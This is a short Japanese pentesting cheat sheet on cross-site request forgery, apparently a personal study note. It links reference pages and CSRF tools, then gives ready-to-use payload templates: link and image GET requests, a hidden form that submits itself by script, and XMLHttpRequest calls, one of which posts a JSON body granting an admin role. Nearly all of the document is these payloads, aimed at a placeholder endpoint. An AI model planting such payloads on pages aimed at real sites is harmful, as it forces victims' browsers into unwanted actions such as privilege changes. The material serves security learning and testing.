# # 参考文献
- https://github.com/six2dez/pentest-book/blob/master/enumeration/web/csrf.md
- [自分で作ったヤツ](obsidian://open?vault=CheatSheet&file=%E5%AD%A6%E7%BF%92%E9%80%B2%E6%8D%97%E7%AE%A1%E7%90%86%2FPortSwigger%2F%E8%84%86%E5%BC%B1%E6%80%A7%E3%81%AE%E8%AA%AC%E6%98%8E%2FCross%20site%20Request%20Forgery%20(CSRF))
# # Tools
- https://github.com/0xInfection/XSRFProbe
- https://github.com/0xInfection/CSRFPocGenerator.git

# # 簡単な攻撃
```payload
# HTML GET
<a href=”http://vulnerable/endpoint?parameter=CSRFd">Click</a>

# HTML GET (no interaction)
<img src=”http://vulnerable/endpoint?parameter=CSRFd">

# HTML POST:
<form action="http://vulnerable/endpoint" method="POST">
<input name="parameter" type="hidden" value="CSRFd" />
<input type="submit" value="Submit Request" />
</form>

# HTML POST (no interaction)
<form id="autosubmit" action="http://vulnerable/endpoint" method="POST">
<input name="parameter" type="hidden" value="CSRFd" />
<input type="submit" value="Submit Request" />
</form>
<script>
document.getElementById("autosubmit").submit();
</script>

# JSON GET:
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://vulnerable/endpoint");
xhr.send();
</script>

# JSON POST
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://vulnerable/endpoint");
xhr.setRequestHeader("Content-Type", "text/plain");
xhr.send('{"role":admin}');
</script>
```